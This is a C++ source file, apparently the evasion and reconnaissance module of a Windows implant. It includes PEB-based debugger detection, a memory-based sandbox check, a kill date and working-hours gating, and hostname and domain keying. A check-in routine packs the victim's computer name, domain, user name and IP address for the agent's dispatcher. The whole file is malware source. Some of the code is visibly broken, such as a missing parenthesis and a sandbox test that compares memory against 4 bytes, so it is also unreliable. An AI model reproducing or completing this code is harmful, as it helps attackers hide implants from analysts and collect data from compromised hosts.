#include <core/include/opsec.hpp>
namespace Opsec {

    BOOL RuntimeChecks() {

        bool success = true;
#ifndef DEBUG
        if (CheckDebugger()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
#endif
        if (CheckSandbox()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }

        defer:
        return success;
    }

    BOOL CheckTime() {

        bool success = true;

        if (Ctx->config.killdate != 0) {
            if (Utils::Time::GetTimeNow() >= Ctx->config.killdate) {
                Commands::Shutdown(nullptr);
            }
        }

        if (Ctx->config.hours) {
            x_assertb(Utils::Time::InWorkingHours());
        }

        defer:
        return success;
    }

    BOOL CheckDebugger() {
        // todo: diagnose why this stopped working

        PPEB peb    = PEB_POINTER;
        BOOL m_x32  = FALSE;

        PVOID heap_base             = { };
        ULONG flags_offset          = 0;
        ULONG force_flags_offset    = 0;
        BOOL vista_or_greater       = Ctx->session.version >= WIN_VERSION_2008;

        Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);

#if _WIN64
        heap_base = !m_x32 ? C_PTR(*RVA(ULONG_PTR*,peb, 0x18)) : C_PTR(*RVA(ULONG_PTR*,peb, 0x1030));

        flags_offset 		= vista_or_greater ? 0x40 : 0x0C;
        force_flags_offset 	= vista_or_greater ? 0x44 : 0x10;
#else
        heap_base           = C_PTR(*RVA(ULONG_PTR*, peb, 0x30);
        flags_offset        = vista_or_greater ? 0x70 : 0x14;
        force_flags_offset  = vista_or_greater ? 0x74 : 0x18;
#endif
        auto HeapFlags      = RVA(ULONG_PTR*, heap_base, flags_offset);
        auto HeapForceFlags = RVA(ULONG_PTR*, heap_base, force_flags_offset);

        return *HeapFlags & ~HEAP_GROWABLE || *HeapForceFlags != 0;
    }

    BOOL CheckSandbox() {
        // todo: check ACPI tables for vm vendors instead of just checking memory

        MEMORYSTATUSEX stats = { };
        stats.dwLength = sizeof(stats);

        Ctx->win32.GlobalMemoryStatusEx(&stats);
        return stats.ullAvailPhys > 4;
    }

    BOOL CheckEnvironment() {
        // todo: add more information to the checkin message

        _stream *out            = Stream::CreateStreamWithHeaders(TypeCheckin);
        IP_ADAPTER_INFO adapter = { };

        unsigned long length    = MAX_PATH;
        char buffer[MAX_PATH]   = { };
        bool success            = true;

        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
            x_assertb(x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) == 0);
            Stream::PackString(out, buffer);
        }
        else {
            Stream::PackDword(out, 0);
        }

        x_memset(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->transport.domain[0]) {
            if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
                x_assertb(x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) == 0);
                Stream::PackString(out, buffer);
            }
            else {
                Stream::PackDword(out, 0);
            }
        }

        x_memset(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
            Stream::PackString(out, buffer);
        }
        else {
            Stream::PackDword(out, 0);
        }

        x_memset(buffer, 0, MAX_PATH);
        length = sizeof(IP_ADAPTER_INFO);

        if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
            Stream::PackString(out, adapter.IpAddressList.IpAddress.String);
        }
        else {
            Stream::PackDword(out, 0);
        }

        x_memset(&adapter, 0, sizeof(IP_ADAPTER_INFO));

    defer:
        Dispatcher::MessageQueue(out);
        return success;
    }

    BOOL ImageCheckArch(const _executable *const image) {

        if (image->nt_head->Signature != IMAGE_NT_SIGNATURE) {
            ntstatus = ERROR_INVALID_EXE_SIGNATURE;
            return false;
        }
        if (image->nt_head->FileHeader.Machine != MACHINE_ARCH) {
            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
            return false;
        }

        return true;
    }

    BOOL ImageCheckCompat(const _executable *const source, const _executable *const target) {

        if (target->nt_head->FileHeader.Machine != source->nt_head->FileHeader.Machine) {
            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
            return false;
        }
        if (target->nt_head->OptionalHeader.Subsystem != source->nt_head->OptionalHeader.Subsystem) {
            ntstatus = ERROR_IMAGE_SUBSYSTEM_NOT_PRESENT;
            return false;
        }

        return true;
    }

    VOID SleepObf() {
        // todo: re-implement proper sleep obfuscation with https://github.com/y11en/FOLIAGE for the time being.
        Utils::Time::Timeout(Utils::Random::RandomSleepTime());
    }
}
